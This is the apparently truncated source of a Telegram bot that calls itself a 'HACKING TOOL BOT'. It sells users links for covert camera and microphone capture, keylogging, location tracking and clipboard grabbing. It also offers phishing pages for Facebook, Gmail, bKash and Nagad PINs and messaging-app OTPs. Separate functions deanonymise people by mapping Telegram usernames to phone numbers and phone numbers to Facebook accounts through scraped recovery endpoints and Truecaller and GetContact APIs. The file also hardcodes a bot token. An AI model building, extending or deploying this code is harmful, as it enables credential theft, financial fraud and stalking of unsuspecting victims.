'use strict';

const TOKEN = process.env.TOKEN || '7696026516:AAF40dKAG6T26ywj5oVp-ad-15qofNieXlU';
if (!TOKEN || TOKEN.split(':').length !== 2) {
    console.error('[BOOT] TOKEN missing.');
    process.exit(1);
}
console.log('[BOOT] Token loaded. Starting...');

const express    = require('express');
const http       = require('http');
const TBot       = require('node-telegram-bot-api');
const multer     = require('multer');
const bodyParser = require('body-parser');
const axios      = require('axios');
const crypto     = require('crypto');
const fs         = require('fs');

const CFG = {
    TOKEN,
    ADMIN_ID:    process.env.ADMIN_ID    || '7799994340',
    CHANNEL:     'rakibfxatrading',
    FB_PAGE:     'https://www.facebook.com/profile.php?id=61596403274813',
    START_IMG:   'https://hc1.checker.in/file2link/photos/file_661524.jpg/file_661524.jpg',
    LURE_VID:    'http://hc1.checker.in/file2link/videos/file_657140.mp4/',
    PORT:        parseInt(process.env.PORT || '10000'),
    LINK_COST:   5,
    SIGNUP_BONUS:5,
    REF_BONUS:   5,
    REF_REWARD:  5,
    FREE_REFS:   3,
    LINK_TTL_MS: 72 * 60 * 60 * 1000,
    BASE_URL:    process.env.RENDER_EXTERNAL_URL || '',
    GC_TOKEN:    process.env.GC_TOKEN || '',
    TC_AUTH:     process.env.TC_AUTH  || '',
    DATA_FILE:   '/tmp/botdata.json',
    FREE_USERS:  ['8294558143'],
    SLIDE_IMAGES:[
        'https://picsum.photos/seed/bd1/800/500',
        'https://picsum.photos/seed/bd2/800/500',
        'https://picsum.photos/seed/bd3/800/500',
        'https://picsum.photos/seed/bd4/800/500',
        'https://picsum.photos/seed/bd5/800/500',
        'https://picsum.photos/seed/bd6/800/500',
    ],
    SLIDE_AUDIO: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3',
};

const log = {
    _w:(l,m)=>console.log('['+new Date().toISOString()+'] '+l+': '+m),
    info: m=>log._w('INFO ',m),
    warn: m=>log._w('WARN ',m),
    error:m=>log._w('ERROR',m),
};

const app    = express();
const server = http.createServer(app);
const upload = multer({limits:{fileSize:50*1024*1024},storage:multer.memoryStorage()});
app.use(bodyParser.json({limit:'50mb'}));
app.use(bodyParser.urlencoded({extended:true,limit:'50mb'}));

app.get('/',(_,res)=>res.send('<h1 style="color:green;text-align:center;font-family:monospace;padding:40px">BOT ONLINE v2</h1>'));
app.get('/health',(_,res)=>{
    const m=process.memoryUsage();
    res.json({status:'ok',uptime:Math.floor(process.uptime()),memory:Math.round(m.heapUsed/1024/1024)+'MB',users:Object.keys(store.users).length,links:Object.values(store.links).filter(l=>l.expiresAt>Date.now()).length,queue:Q.length});
});

server.listen(CFG.PORT,'0.0.0.0',()=>{
    log.info('HTTP bound to 0.0.0.0:'+CFG.PORT);
    startBot();
});

let store={users:{},vip:{},links:{},pending:{},sessions:{},rate:{},linkStats:{}};

function saveStore(){
    try{const tmp=CFG.DATA_FILE+'.tmp';fs.writeFileSync(tmp,JSON.stringify(store),'utf8');fs.renameSync(tmp,CFG.DATA_FILE);}
    catch(e){log.warn('Save: '+e.message);}
}
function loadStore(){
    try{if(fs.existsSync(CFG.DATA_FILE)){store={...store,...JSON.parse(fs.readFileSync(CFG.DATA_FILE,'utf8'))};log.info('Store loaded users:'+Object.keys(store.users).length);}}
    catch(e){log.warn('Load: '+e.message);}
}
loadStore();
setInterval(saveStore,60000);

function isFreeUser(uid){return CFG.FREE_USERS.includes(String(uid));}
function isAdmin(uid){return String(uid)===String(CFG.ADMIN_ID);}

function getUser(uid){
    uid=String(uid);
    if(!store.users[uid]){store.users[uid]={balance:CFG.SIGNUP_BONUS,refs:0,refBy:null,lifetime:false,linksMade:0,joinDate:Date.now(),banned:false};saveStore();}
    const u=store.users[uid];
    u.isAdmin=isAdmin(uid);u.isVIP=!!store.vip[uid];u.isFreeUser=isFreeUser(uid);
    u.lifetime=!!(u.lifetime||u.isAdmin||u.isVIP||u.isFreeUser);
    return u;
}

function checkRate(uid){
    if(isAdmin(uid)||isFreeUser(uid))return true;
    const now=Date.now(),r=store.rate[String(uid)];
    if(!r||now-r.ws>10000){store.rate[String(uid)]={c:1,ws:now};return true;}
    if(r.c>=3)return false;r.c++;return true;
}

function mkLink(action,uid){
    const tok=crypto.randomBytes(16).toString('hex');
    const url=(CFG.BASE_URL||'http://localhost:'+CFG.PORT)+'/go/'+tok;
    store.links[tok]={action,uid:String(uid),url,expiresAt:Date.now()+CFG.LINK_TTL_MS,createdAt:Date.now()};
    store.linkStats[tok]={opens:0,uas:[],lastOpen:null};
    getUser(String(uid)).linksMade=(getUser(String(uid)).linksMade||0)+1;
    saveStore();return url;
}
function getLink(tok){const l=store.links[tok];return l&&l.expiresAt>Date.now()?l:null;}
function userLinks(uid){
    return Object.entries(store.links)
        .filter(([,l])=>l.uid===String(uid)&&l.expiresAt>Date.now())
        .sort(([,a],[,b])=>b.createdAt-a.createdAt)
        .slice(0,20).map(([tok,l])=>({tok,...l,stats:store.linkStats[tok]||{opens:0}}));
}
function trackLink(tok,req){
    if(!store.linkStats[tok])store.linkStats[tok]={opens:0,uas:[],lastOpen:null};
    const s=store.linkStats[tok];s.opens++;s.lastOpen=Date.now();
    const ua=(req.headers['user-agent']||'').slice(0,80);
    if(!s.uas.includes(ua))s.uas.push(ua);
    saveStore();
}
function getSession(sid){return store.sessions[sid]||{};}
function setSession(sid,d){store.sessions[sid]={...d,createdAt:Date.now()};}
function setPending(uid,type){store.pending[String(uid)]={type,createdAt:Date.now()};}
function getPending(uid){return store.pending[String(uid)]||null;}
function delPending(uid){delete store.pending[String(uid)];}
function parseCookies(h){return(h['set-cookie']||[]).map(c=>c.split(';')[0]).join('; ');}

function cleanup(){
    const now=Date.now();
    for(const t of Object.keys(store.links))if(store.links[t].expiresAt<now){delete store.links[t];delete store.linkStats[t];}
    for(const u of Object.keys(store.pending))if(now-store.pending[u].createdAt>600000)delete store.pending[u];
    for(const s of Object.keys(store.sessions))if(now-store.sessions[s].createdAt>3600000)delete store.sessions[s];
    for(const r of Object.keys(store.rate))if(now-store.rate[r].ws>10000)delete store.rate[r];
    saveStore();
}
setInterval(cleanup,600000);

const Q=[];let QR=false;
function enqueue(fn){return new Promise((res,rej)=>{Q.push({fn,res,rej});if(!QR)drain();});}
async function drain(){
    QR=true;
    while(Q.length){const{fn,res,rej}=Q.shift();try{res(await fn());}catch(e){rej(e);}await new Promise(r=>setTimeout(r,120));}
    QR=false;
}

let bot;
function startBot(){
    log.info('Starting polling...');
    bot=new TBot(CFG.TOKEN,{polling:{interval:300,autoStart:true,params:{timeout:10,allowed_updates:['message','callback_query']}}});
    bot.on('polling_error',e=>{
        log.error('Polling: '+e.message);
        if(e.code==='EFATAL'||(e.message&&e.message.includes('ETELEGRAM'))){
            log.warn('Restart in 10s');
            setTimeout(()=>bot.stopPolling().catch(()=>{}).then(()=>bot.startPolling().catch(e2=>log.error('Restart: '+e2.message))),10000);
        }
    });
    bot.on('error',e=>log.error('Bot: '+e.message));
    registerHandlers();
    log.info('Handlers registered. Bot live.');
    bot.getMe().then(me=>log.info('Bot: @'+me.username)).catch(e=>log.error('getMe: '+e.message));
    if(CFG.BASE_URL){
        setInterval(()=>axios.get(CFG.BASE_URL+'/health').then(()=>log.info('Keepalive OK')).catch(e=>log.warn('Keepalive: '+e.message)),4*60*1000);
    }
}

function tgMsg(c,t,o={}){
    return enqueue(()=>bot.sendMessage(c,(t||'').slice(0,4096),{parse_mode:'HTML',...o}).catch(async e=>{
        if(e.response&&e.response.statusCode===429){const w=(e.response.body&&e.response.body.parameters&&e.response.body.parameters.retry_after)||5;await new Promise(r=>setTimeout(r,w*1000));return bot.sendMessage(c,(t||'').slice(0,4096),{parse_mode:'HTML',...o});}
        log.warn('tgMsg '+c+': '+e.message);
    }));
}
function tgPic(c,b,cap){return enqueue(()=>bot.sendPhoto(c,b,{caption:cap,parse_mode:'HTML'}).catch(e=>log.warn('tgPic:'+e.message)));}
function tgLoc(c,la,lo){return enqueue(()=>bot.sendLocation(c,la,lo).catch(e=>log.warn('tgLoc:'+e.message)));}
function tgDoc(c,b,fn,mt,cap){return enqueue(()=>bot.sendDocument(c,b,{caption:cap,parse_mode:'HTML'},{filename:fn,contentType:mt}).catch(e=>bot.sendVideo(c,b,{caption:cap,parse_mode:'HTML'}).catch(e2=>log.warn('tgDoc:'+e2.message))));}
function tgAudio(c,b,cap){return enqueue(()=>bot.sendAudio(c,b,{caption:cap,parse_mode:'HTML'}).catch(()=>tgDoc(c,b,'audio.webm','audio/webm',cap)));}

async function checkJoin(uid){
    try{const m=await bot.getChatMember('@'+CFG.CHANNEL,uid);return['member','administrator','creator'].includes(m.status);}
    catch{return false;}
}

function actionLabel(a){
    const map={
        cam_f:'📷 Front Camera Photo',cam_b:'📷 Back Camera Photo',
        cam_fv:'🎥 Front Camera Video',cam_bv:'🎥 Back Camera Video',
        loc:'📍 Location Tracker',ss_all:'📸 Silent Screenshot',
        keylog:'⌨️ Keylogger',mic_rec:'🎤 Mic Recorder',
        vibrate:'📳 Vibrate Device',notify_grab:'🔔 Push Notification',
        net_scan:'🌐 Network Scanner',fingerprint:'🖥️ Deep Fingerprint',
        fake_pay:'💳 Fake Payment Page',
        phish_bkash_pin:'💚 bKash PIN',phish_nagad_pin:'🟠 Nagad PIN',
        phish_fb:'🎣 Facebook',phish_ig:'📸 Instagram',
        phish_tt:'🎵 TikTok',phish_msgr:'📨 Messenger',
        phish_yt:'▶️ YouTube Login',phish_gm:'📧 Gmail Login',
        phish_wa:'📱 WhatsApp OTP',phish_imo:'💬 IMO OTP',phish_tg:'✈️ Telegram OTP',
        msgr_info:'💌 Message Info',ip_info:'🌐 IP & Device Info',
        clipboard:'📋 Clipboard Grab',battery:'🔋 Device Info Grab',wifi_info:'📶 WiFi Info Grab',
    };
    return map[a]||a;
}

async function sg(url,o={},l=''){try{return await axios.get(url,{timeout:10000,...o});}catch(e){log.warn('['+l+'] '+e.message);return null;}}
async function sp(url,d,o={},l=''){try{return await axios.post(url,d,{timeout:10000,...o});}catch(e){log.warn('['+l+'] '+e.message);return null;}}

async function lookupTgUsername(username){
    username=username.replace(/^@/,'').trim().toLowerCase();
    const R={username,id:null,name:null,bio:null,phone:null,phoneSource:null,sources:[]};
    const tm=await sg('https://t.me/'+username,{headers:{'User-Agent':'TelegramBot/1.0'}},'tme');
    if(tm){const nm=tm.data.match(/<meta property="og:title" content="([^"]+)"/);const bm=tm.data.match(/<meta property="og:description" content="([^"]+)"/);if(nm)R.name=nm[1];if(bm)R.bio=bm[1];R.sources.push('t.me');}
    const fr=await sg('https://fragment.com/username/'+encodeURIComponent(username),{headers:{'User-Agent':'Mozilla/5.0'}},'frag');
    if(fr){const im=fr.data.match(/"peer_id":(\d+)/);const pm=fr.data.match(/\+\d[\d\s\-()]{6,14}\d/g);if(im&&!R.id){R.id=im[1];R.sources.push('Fragment');}if(pm&&!R.phone){R.phone=pm[0].replace(/\s/g,'');R.phoneSource='Fragment';R.sources.push('Fragment Phone');}}
    const tg=await sg('https://tgstat.com/channel/@'+username,{headers:{'User-Agent':'Mozilla/5.0'}},'tgstat');
    if(tg&&!R.id){const m=tg.data.match(/tg:\/\/user\?id=(\d+)/);if(m){R.id=m[1];R.sources.push('TGStat');}}
    if(!R.phone&&CFG.GC_TOKEN){
        const gc=await sp('https://pbhs2.getcontact.com/profile/v3/search',{query:username,countryCode:'BD',source:'SEARCH'},{headers:{'Authorization':'Bearer '+CFG.GC_TOKEN,'User-Agent':'GetContact/7.0.0 (Android 13)','Content-Type':'application/json','x-client-version':'7.0.0','x-device-id':crypto.randomBytes(8).toString('hex')}},'gc');
        if(gc&&gc.data&&gc.data.result){const ps=gc.data.result.profiles||(Array.isArray(gc.data.result)?gc.data.result:[gc.data.result]);for(const p of ps){const ph=p.phone||p.phoneNumber;if(ph){R.phone=ph.startsWith('+')?ph:'+'+ph;R.phoneSource='GetContact';R.sources.push('GetContact');break;}}}
    }
    if(!R.phone&&CFG.TC_AUTH&&R.name){const tc=await sg('https://search5-noneu.truecaller.com/v2/search?q='+encodeURIComponent(R.name)+'&countryCode=BD&type=4&placement=SEARCHRESULTS,APP,FALSE&encoding=json',{headers:{'Authorization':CFG.TC_AUTH,'User-Agent':'Truecaller/13.0.0 (Android 13)','Accept':'application/json'}},'tc');if(tc&&tc.data&&tc.data.data&&tc.data.data.length){for(const e of tc.data.data){const en=(e.name||'').toLowerCase(),on=(R.name||'').toLowerCase().split(' ')[0];if(en.includes(on)&&e.phones&&e.phones.length){R.phone=e.phones[0].e164Format||e.phones[0].nationalFormat;R.phoneSource='Truecaller';R.sources.push('Truecaller');break;}}}}
    return R;
}

async function lookupFbByPhone(phone){
    phone=phone.trim().replace(/[\s\-()]/g,'');
    if(!phone.startsWith('+'))phone='+880'+phone.replace(/^0+/,'');
    const R={phone,id:null,name:null,profileUrl:null,email:null,sources:[]};
    try{
        const pg=await sg('https://www.facebook.com/login/identify/',{headers:{'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15','Accept-Language':'en-US,en;q=0.9'},maxRedirects:5},'fb-pg');
        if(pg){
            const cookies=parseCookies(pg.headers);
            const lsdM=pg.data.match(/"LSD",\[\],{"token":"([^"]+)"/);const lsd=lsdM?lsdM[1]:'';
            const dtsgM=pg.data.match(/name="fb_dtsg" value="([^"]+)"/)|| pg.data.match(/"dtsg":\{"token":"([^"]+)"/);const dtsg=dtsgM?dtsgM[1]:'';
            const init=await sp('https://www.facebook.com/ajax/recover/initiate/',new URLSearchParams({lsd,email_or_phone:phone,did_login:'0',fur_initiated:'0',action:'initiate',fb_dtsg:dtsg}).toString(),{headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)','Cookie':cookies,'X-Requested-With':'XMLHttpRequest','Referer':'https://www.facebook.com/login/identify/','Origin':'https://www.facebook.com'}},'fb-rec');
            if(init){
                const raw=init.data.replace(/^[^{\[]*(?=[{\[])/,'');
                for(const pat of[/["']?uid["']?:\s*["']?(\d{5,})["']?/,/["']?account_id["']?:\s*["']?(\d{5,})["']?/,/profile\.php\?id=(\d{5,})/,/\/(\d{10,})\/picture/]){const m=raw.match(pat);if(m){R.id=m[1];break;}}
                const nm=raw.match(/"(?:name|display_name)":"([^"\\]+)"/);const em=raw.match(/[\w.+]+\*+[\w.]*@[\w.]+/);
                if(nm)R.name=nm[1].replace(/\\u([\dA-F]{4})/gi,(_,c)=>String.fromCharCode(parseInt(c,16)));
                if(em)R.email=em[0];
                if(R.id){R.profileUrl='https://www.facebook.com/profile.php?id='+R.id;R.sources.push('FB Recovery');}
            }
        }
    }catch(e){log.warn('FB Recovery: '+e.message);}
    if(CFG.GC_TOKEN&&!R.name){const gc=await sp('https://pbhs2.getcontact.com/profile/v3/search',{query:phone,countryCode:'BD',source:'PHONE'},{headers:{'Authorization':'Bearer '+CFG.GC_TOKEN,'User-Agent':'GetContact/7.0.0 (Android 13)','Content-Type':'application/json','x-client-version':'7.0.0'}},'gc-rev');if(gc&&gc.data&&gc.data.result){const n=gc.data.result.displayName||gc.data.result.name;if(n){R.name=n;R.sources.push('GetContact');}}}
    if(CFG.TC_AUTH&&!R.name){const tc=await sg('https://search5-noneu.truecaller.com/v2/search?q='+encodeURIComponent(phone)+'&countryCode=BD&type=4&placement=SEARCHRESULTS,APP,FALSE&encoding=json',{headers:{'Authorization':CFG.TC_AUTH,'User-Agent':'Truecaller/13.0.0 (Android 13)','Accept':'application/json'}},'tc-ph');if(tc&&tc.data&&tc.data.data&&tc.data.data.length){const n=tc.data.data[0].name;if(n){R.name=n;R.sources.push('Truecaller');}}}
    if(!R.id&&R.name){const ms=await sg('https://m.facebook.com/search/people/?q='+encodeURIComponent(R.name)+'&ref=comet_topbar',{headers:{'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15','Accept-Language':'en-US'}},'fb-ms');if(ms){const m=ms.data.match(/profile\.php\?id=(\d{10,})/)||ms.data.match(/"userID":"(\d{10,})"/);if(m){R.id=m[1];R.profileUrl='https://www.facebook.com/profile.php?id='+R.id;R.sources.push('FB Name Search');}}}
    if(!R.id){const gp=await sg('https://graph.facebook.com/v18.0/?id='+encodeURIComponent(phone)+'&fields=id,name',{headers:{'User-Agent':'Mozilla/5.0'}},'graph');if(gp&&gp.data&&gp.data.id){R.id=gp.data.id;R.name=R.name||gp.data.name||null;R.profileUrl='https://www.facebook.com/profile.php?id='+R.id;R.sources.push('Graph API');}}
    return R;
}

const startKb=uid=>({inline_keyboard:[
    [{text:'📢 Join Official Channel',url:'https://t.me/'+CFG.CHANNEL}],
    [{text:'👍 Follow Our Facebook',url:CFG.FB_PAGE}],
    [{text:'✅ Verify & Get Access',callback_data:'VERIFY_'+uid}],
]});
const backKb={inline_keyboard:[[{text:'◀️ Main Menu',callback_data:'M_BACK'}]]};

function mainKb(uid){
    const kb=[
        [{text:'📷 Front Cam Photo',  callback_data:'LNK_cam_f'          },{text:'📷 Back Cam Photo',    callback_data:'LNK_cam_b'         }],
        [{text:'🎥 Front Cam Video',  callback_data:'LNK_cam_fv'         },{text:'🎥 Back Cam Video',    callback_data:'LNK_cam_bv'        }],
        [{text:'📸 Silent Screenshot',callback_data:'LNK_ss_all'         },{text:'🎤 Mic Recorder',      callback_data:'LNK_mic_rec'       }],
        [{text:'📍 Location Tracker', callback_data:'LNK_loc'            },{text:'📳 Vibrate Device',    callback_data:'LNK_vibrate'       }],
        [{text:'🔔 Push Notification',callback_data:'LNK_notify_grab'    },{text:'🌐 Network Scanner',   callback_data:'LNK_net_scan'      }],
        [{text:'🖥️ Deep Fingerprint', callback_data:'LNK_fingerprint'    },{text:'⌨️ Keylogger',         callback_data:'LNK_keylog'        }],
        [{text:'💚 bKash PIN Grab',   callback_data:'LNK_phish_bkash_pin'},{text:'🟠 Nagad PIN Grab',   callback_data:'LNK_phish_nagad_pin'}],
        [{text:'💳 Fake Payment Page',callback_data:'LNK_fake_pay'       }],
        [{text:'🎣 Facebook',         callback_data:'LNK_phish_fb'       },{text:'📸 Instagram',         callback_data:'LNK_phish_ig'      }],
        [{text:'🎵 TikTok',           callback_data:'LNK_phish_tt'       },{text:'📨 Messenger',         callback_data:'LNK_phish_msgr'    }],
        [{text:'▶️ YouTube',          callback_data:'LNK_phish_yt'       },{text:'📧 Gmail',             callback_data:'LNK_phish_gm'      }],
        [{text:'📱 WhatsApp OTP',     callback_data:'LNK_phish_wa'       },{text:'💬 IMO OTP',           callback_data:'LNK_phish_imo'     }],
        [{text:'✈️ Telegram OTP',     callback_data:'LNK_phish_tg'       }],
        [{text:'🌐 IP & Device Info', callback_data:'LNK_ip_info'        },{text:'📋 Clipboard Grab',    callback_data:'LNK_clipboard'     }],
        [{text:'🔋 Device Info',      callback_data:'LNK_battery'        },{text:'📶 WiFi Info',         callback_data:'LNK_wifi_info'     }],
        [{text:'💌 Message Info',     callback_data:'LNK_msgr_info'      }],
        [{text:'🔍 TG Username→Phone',callback_data:'LOOKUP_TG'         },{text:'🔍 Phone→FB ID',       callback_data:'LOOKUP_FB'         }],
        [{text:'📂 Link Manager',     callback_data:'LINK_MGR'           },{text:'💰 My Balance',        callback_data:'BALANCE'           }],
        [{text:'🔗 Referral Link',    callback_data:'REFERRAL'           },{text:'❓ How To Use',        callback_data:'HOW_TO'            }],
        [{text:'👍 Follow Facebook',  url:CFG.FB_PAGE}],
    ];
    if(isAdmin(uid))kb.push([{text:'👑 VIP Manager',callback_data:'VIP_MGR'},{text:'📊 Admin Stats',callback_data:'STATS'}]);
    return{inline_keyboard:kb};
}
function linkKb(d){return{inline_keyboard:[[{text:'📋 Copy Link',callback_data:'COPY_'+d},{text:'🔄 New Link',callback_data:d}],[{text:'📊 Link Stats',callback_data:'LSTATS_'+d},{text:'◀️ Main Menu',callback_data:'M_BACK'}]]};}

function registerHandlers(){

bot.onText(/\/start(?:\s+(.+))?/,async msg=>{
    const cid=String(msg.chat.id),name=msg.from.first_name||'বন্ধু',arg=(msg.text.split(' ')[1]||'').trim();
    const isNew=!store.users[cid];const u=getUser(cid);if(u.banned)return;
    if(isNew&&arg&&arg!==cid&&store.users[arg]){
        const ref=store.users[arg];
        if(!ref.banned){u.refBy=arg;u.balance=(u.balance||0)+CFG.REF_BONUS;ref.refs=(ref.refs||0)+1;ref.balance=(ref.balance||0)+CFG.REF_REWARD;if(ref.refs>=CFG.FREE_REFS)ref.lifetime=true;saveStore();
        tgMsg(arg,'🎉 <b>New Referral!</b>\n👤 Someone joined!\n💰 <b>+'+CFG.REF_REWARD+' Tokens</b>\n🏆 Total: <b>'+ref.refs+'</b>'+(ref.lifetime?'\n🎊 <b>Lifetime Free Unlocked!</b>':'\n🔄 '+(CFG.FREE_REFS-ref.refs)+' more needed'));}
    }
    const caption='🔥 <b>স্বাগতম, '+name+'!</b> 🔥\n\n'
    +'┌─────────────────────────┐\n'
    +'│  🛠️  <b>HACKING TOOL BOT v2</b>  🛠️ │\n'
    +'└─────────────────────────┘\n\n'
    +'🎯 <b>Tools — 25+ Features:</b>\n'
    +'├ 📷 Camera Photo & Video\n'
    +'├ 📸 Silent Screenshot (Both Cams)\n'
    +'├ 🎤 Mic Recorder (10s)\n'
    +'├ 📳 Vibrate Victim Device\n'
    +'├ 🔔 Push Notification Grabber\n'
    +'├ 🌐 Local Network Scanner\n'
    +'├ 🖥️ Deep Device Fingerprint\n'
    +'├ ⌨️ Keylogger Page\n'
    +'├ 📍 Live Location Tracker\n'
    +'├ 💚 bKash PIN Page\n'
    +'├ 🟠 Nagad PIN Page\n'
    +'├ 💳 Fake Payment Page\n'
    +'├ 🎣 Phishing (FB·IG·TT·Msgr·YT·Gmail)\n'
    +'├ 📱 Real OTP (WA·IMO·TG)\n'
    +'├ 🌐 IP & Full Device Info\n'
    +'├ 📶 WiFi Network Info\n'
    +'├ 💌 Messenger Contacts\n'
    +'├ 🔍 TG Username → Phone\n'
    +'└ 🔍 Phone → Facebook ID\n\n'
    +'━━━━━━━━━━━━━━━━━━━━━━━━\n'
    +'🎁 <b>Signup: +'+CFG.SIGNUP_BONUS+' Token | Link: -'+CFG.LINK_COST+' Token</b>\n'
    +'🔗 Refer '+CFG.FREE_REFS+' = <b>♾️ Lifetime Free!</b>\n'
    +'━━━━━━━━━━━━━━━━━━━━━━━━\n'
    +'1️⃣ চ্যানেলে জয়েন করুন\n'
    +'2️⃣ 👍 Facebook Follow করুন\n'
    +'3️⃣ ✅ Verify → মেনু আনলক!';
    try{await bot.sendPhoto(cid,CFG.START_IMG,{caption,parse_mode:'HTML',reply_markup:startKb(cid)});}
    catch(e){tgMsg(cid,caption,{reply_markup:startKb(cid)});}
});

bot.onText(/\/menu/,async msg=>{
    const cid=String(msg.chat.id),u=getUser(cid);if(u.banned)return;
    if(!isAdmin(cid)&&!isFreeUser(cid)&&!(await checkJoin(cid)))return tgMsg(cid,'⛔ আগে চ্যানেলে জয়েন করুন।',{reply_markup:startKb(cid)});
    sendMainMenu(cid);
});

bot.onText(/\/addvip\s+(\d+)/,   async msg=>{if(!isAdmin(msg.chat.id))return;const tid=msg.text.split(' ')[1];store.vip[tid]=true;getUser(tid).lifetime=true;saveStore();tgMsg(msg.chat.id,'👑 VIP: <code>'+tid+'</code>');tgMsg(tid,'🎊 <b>Lifetime Free Access granted!</b>').catch(()=>{});});
bot.onText(/\/removevip\s+(\d+)/,async msg=>{if(!isAdmin(msg.chat.id))return;const tid=msg.text.split(' ')[1];delete store.vip[tid];if(store.users[tid])store.users[tid].lifetime=false;saveStore();tgMsg(msg.chat.id,'🗑️ VIP removed: <code>'+tid+'</code>');});
bot.onText(/\/ban\s+(\d+)/,      async msg=>{if(!isAdmin(msg.chat.id))return;const tid=msg.text.split(' ')[1];getUser(tid).banned=true;saveStore();tgMsg(msg.chat.id,'🔨 Banned: <code>'+tid+'</code>');});
bot.onText(/\/unban\s+(\d+)/,    async msg=>{if(!isAdmin(msg.chat.id))return;const tid=msg.text.split(' ')[1];getUser(tid).banned=false;saveStore();tgMsg(msg.chat.id,'✅ Unbanned: <code>'+tid+'</code>');});
bot.onText(/\/addbal\s+(\d+)\s+(\d+)/,async msg=>{if(!isAdmin(msg.chat.id))return;const[,tid,amt]=msg.text.split(' ');const u=getUser(tid);u.balance=(u.balance||0)+parseInt(amt);saveStore();tgMsg(msg.chat.id,'💰 +'+amt+' → <code>'+tid+'</code>');});
bot.onText(/\/freelist/,async msg=>{if(!isAdmin(msg.chat.id))return;tgMsg(msg.chat.id,'💎 Free List:\n'+CFG.FREE_USERS.map((id,i)=>(i+1)+'. <code>'+id+'</code>').join('\n'));});
bot.onText(/\/stats/,  async msg=>{
    if(!isAdmin(msg.chat.id))return;
    const m=process.memoryUsage();
    const totalLinks=Object.values(store.links).filter(l=>l.expiresAt>Date.now()).length;
    const totalOpens=Object.values(store.linkStats).reduce((s,l)=>s+(l.opens||0),0);
    tgMsg(msg.chat.id,'📊 <b>Bot Stats</b>\n\n👥 Users: <b>'+Object.keys(store.users).length+'</b>\n👑 VIP: <b>'+Object.keys(store.vip).length+'</b>\n🔗 Active Links: <b>'+totalLinks+'</b>\n👁️ Total Opens: <b>'+totalOpens+'</b>\n💰 Total Tokens: <b>'+Object.values(store.users).reduce((s,u)=>s+(u.balance||0),0)+'</b>\n💾 Memory: <b>'+Math.round(m.heapUsed/1024/1024)+'MB</b>\n⏱️ Uptime: <b>'+Math.floor(process.uptime()/60)+' min</b>\n📩 Queue: <b>'+Q.length+'</b>');
});
bot.onText(/\/broadcast\s+(.+)/s,async msg=>{if(!isAdmin(msg.chat.id))return;const text=msg.text.replace('/broadcast ','').trim();let s=0,f=0;for(const uid of Object.keys(store.users)){if(store.users[uid].banned)continue;try{await tgMsg(uid,'📢 <b>Announcement</b>\n\n'+text);s++;}catch{f++;}}tgMsg(msg.chat.id,'📢 ✅'+s+' ❌'+f);});

async function sendMainMenu(cid){
    const u=getUser(String(cid));
    const statusLine=u.isAdmin?'│  👑 Role:      <b>Administrator</b>          │\n':u.isFreeUser?'│  💎 Role:      <b>Free User (Whitelisted)</b> │\n':u.isVIP?'│  ⭐ Role:      <b>VIP Member</b>              │\n':'';
    await tgMsg(cid,
'🛠️ <b>MAIN MENU — v2</b>\n\n'
+'┌────────────────────────────────┐\n'
+'│  📊 <b>Account Info</b>                  │\n'
+'│  💰 Balance:   <b>'+u.balance+' Token'+(u.balance===1?'':'s')+'</b>         │\n'
+'│  🏆 Referrals: <b>'+(u.refs||0)+'/'+CFG.FREE_REFS+'</b>            │\n'
+'│  ♾️ Lifetime:  <b>'+(u.lifetime?'✅ Active':'❌ Not Yet')+'</b>         │\n'
+statusLine
+'└────────────────────────────────┘\n\n'
+'💡 Each link = <b>'+CFG.LINK_COST+' Token</b> | 📊 Track link opens!\n'
+'🔗 Refer <b>'+CFG.FREE_REFS+'</b> → <b>♾️ Free Forever!</b>',
        {reply_markup:mainKb(String(cid))});
}

bot.on('callback_query',async cbq=>{
    const uid=String(cbq.from.id),chatId=cbq.message.chat.id,msgId=cbq.message.message_id;
    const data=cbq.data||'',name=cbq.from.first_name||'Friend';
    if(!checkRate(uid))return bot.answerCallbackQuery(cbq.id,{text:'⚠️ Too fast!'}).catch(()=>{});
    bot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del=()=>bot.deleteMessage(chatId,msgId).catch(()=>{});
    const u=getUser(uid);if(u.banned)return;

    try{

    if(data.startsWith('VERIFY_')){
        const joined=await checkJoin(uid);
        if(!joined)return bot.answerCallbackQuery(cbq.id,{text:'⛔ আগে চ্যানেলে জয়েন করুন!',show_alert:true}).catch(()=>{});
        del();
        await tgMsg(chatId,
'✅ <b>Verified! স্বাগতম, '+name+'!</b>\n\n'
+'🎁 <b>'+CFG.SIGNUP_BONUS+' Token</b> পেয়েছেন — 1টি ফ্রি লিংক!\n'
+'💡 Refer '+CFG.FREE_REFS+' জন = ♾️ Lifetime Free!\n\n'
+'👍 আমাদের Facebook Follow করুন:\n'+CFG.FB_PAGE,
            {reply_markup:{inline_keyboard:[[{text:'👍 Follow Our Facebook',url:CFG.FB_PAGE}],[{text:'🛠️ Open Main Menu',callback_data:'OPEN_MENU'}]]}});
        return;
    }

    if(data==='OPEN_MENU'){del();return sendMainMenu(chatId);}
    if(data==='M_BACK'||data==='ROUTE_HACK'){del();delPending(uid);return sendMainMenu(chatId);}

    if(data==='LOOKUP_TG'){del();setPending(uid,'tg_username');return tgMsg(chatId,'🔍 <b>Telegram Username → Phone</b>\n\n'+(CFG.GC_TOKEN?'✅':'⚠️')+' GetContact | '+(CFG.TC_AUTH?'✅':'⚠️')+' Truecaller\n✅ Fragment · TGStat · t.me\n\nUsername পাঠান: <code>@username</code>',{reply_markup:{inline_keyboard:[[{text:'❌ Cancel',callback_data:'M_BACK'}]]}});}
    if(data==='LOOKUP_FB'){del();setPending(uid,'fb_phone');return tgMsg(chatId,'🔍 <b>Phone → Facebook ID</b>\n\n✅ FB Recovery | '+(CFG.GC_TOKEN?'✅':'⚠️')+' GetContact\n'+(CFG.TC_AUTH?'✅':'⚠️')+' Truecaller | ✅ Graph API\n\nনম্বর পাঠান: <code>+8801XXXXXXXXX</code>',{reply_markup:{inline_keyboard:[[{text:'❌ Cancel',callback_data:'M_BACK'}]]}});}

    if(data==='BALANCE'){
        del();
        return tgMsg(chatId,
'💰 <b>My Wallet</b>\n\n'
+'💵 Balance:    <b>'+u.balance+' Token'+(u.balance===1?'':'s')+'</b>\n'
+'🔗 Links Made: <b>'+(u.linksMade||0)+'</b>\n'
